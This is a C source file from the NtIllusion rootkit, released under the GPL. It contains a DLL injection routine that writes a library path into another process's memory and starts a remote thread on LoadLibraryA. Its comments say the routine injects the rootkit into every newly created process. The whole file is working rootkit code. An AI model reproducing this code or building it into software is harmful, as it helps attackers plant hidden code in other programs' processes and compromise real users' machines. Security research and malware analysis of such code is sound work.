/******************************************************************************
  kInjectEng.c	: ROOTKIT *INJECTION ENGINE*
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/
#include <windows.h>
#include "kInjectEng.h"
#include "../../Misc/kNTIConfig.h"
#include "../../Misc/kNTILib.h"

extern FARPROC fGetProcAddress;

/*	*********************************************************************************
	*					ROOTKIT *INJECTION ENGINE*		:							*
	*********************************************************************************
*/
//		InjectDll : this functions injects the DLL named DLLFile into a process identified by its handle hModule
//		This is used to inject the rootkit into any newly created process
int InjectDll(HANDLE hModule, char *DLLFile)
{
	int LenWrite;
	char * AllocMem;
	HANDLE hThread;
	DWORD Result;
	PTHREAD_START_ROUTINE Injector;
	FARPROC pLoadLibrary=NULL;

	LenWrite = strlen(DLLFile) + 1;

	
	//allocation for WriteProcessMemory
	AllocMem = (char *) VirtualAllocEx(hModule,NULL, LenWrite,
						MEM_COMMIT,PAGE_READWRITE);

	WriteProcessMemory(hModule, AllocMem , DLLFile, LenWrite, NULL);
			
	pLoadLibrary = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	Injector = (PTHREAD_START_ROUTINE) pLoadLibrary;

	if(!Injector)
	{
		if(VERBOSE_ERRORS) OutputString("Cannot inject THREAD_START_ROUTINE\n");
		return 0;
	}

	hThread = CreateRemoteThread(hModule, NULL, 0, Injector, 
				(void *) AllocMem, 0, NULL);
	if(!hThread)
	{
		if(VERBOSE_ERRORS) OutputString("Cannot create THREAD_START_ROUTINE\n");
		return 0;
	}

	Result = WaitForSingleObject(hThread, 15*1000); //Time out : 15 seconds
	if(Result==WAIT_ABANDONED || Result==WAIT_TIMEOUT || Result==WAIT_FAILED)
	{
		if(VERBOSE_ERRORS) OutputString("WaitForSingleObject bad result\n");
		return 0;
	}
	
	//Sleep(1000);
	VirtualFreeEx(hModule, (void *) AllocMem, 0, MEM_RELEASE);
	if(hThread!=NULL) CloseHandle(hThread); // (MSDN: Closing a thread handle does not terminate the associated thread.)

return 1;
}
